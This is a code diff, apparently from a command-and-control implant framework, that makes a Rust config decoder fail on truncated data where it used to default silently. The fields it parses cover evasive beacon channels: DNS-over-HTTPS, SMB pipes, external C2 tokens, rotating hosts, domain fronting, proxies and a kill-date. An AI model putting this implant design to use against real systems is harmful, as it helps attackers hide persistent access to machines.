@@ -136,22 +136,23 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
     // original fields. Old configs (build-time or unpatched .nyx_cfg) stop
     // after use_tls — `remaining()==0` → default to Https-only with empty
     // channel params. This is fully backward-compatible.
+    //
+    // implant-beacon-6: when the extended tail IS present but truncated, the
+    // field reads now FAIL (propagate `?`) instead of silently defaulting — a
+    // shape-mismatched blob must not silently zero the rotation/proxy/channel
+    // fields (or, in config_placeholder, the kill-date).
     let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host, extc2_token,
          rotation_hosts, fronting_host, proxy_server) =
         if r.remaining() > 0 {
-            let primary_channel = r.u8().unwrap_or(0);
-            let fallback_bitmap = r.u8().unwrap_or(0);
-            let doh_resolver = r.str().unwrap_or_default();
-            let smb_pipe_name = r.str().unwrap_or_default();
-            let extc2_api_host = r.str().unwrap_or_default();
-            let extc2_token = r.str().unwrap_or_default();
+            let primary_channel = r.u8()?;
+            let fallback_bitmap = r.u8()?;
+            let doh_resolver = r.str()?;
+            let smb_pipe_name = r.str()?;
+            let extc2_api_host = r.str()?;
+            let extc2_token = r.str()?;
             // spec-7 HTTP enhancement fields — further backward compat layer.
             let (rotation_hosts, fronting_host, proxy_server) = if r.remaining() > 0 {
-                (
-                    r.str().unwrap_or_default(),
-                    r.str().unwrap_or_default(),
-                    r.str().unwrap_or_default(),
-                )
+                (r.str()?, r.str()?, r.str()?)
             } else {
                 (String::new(), String::new(), String::new())
             };
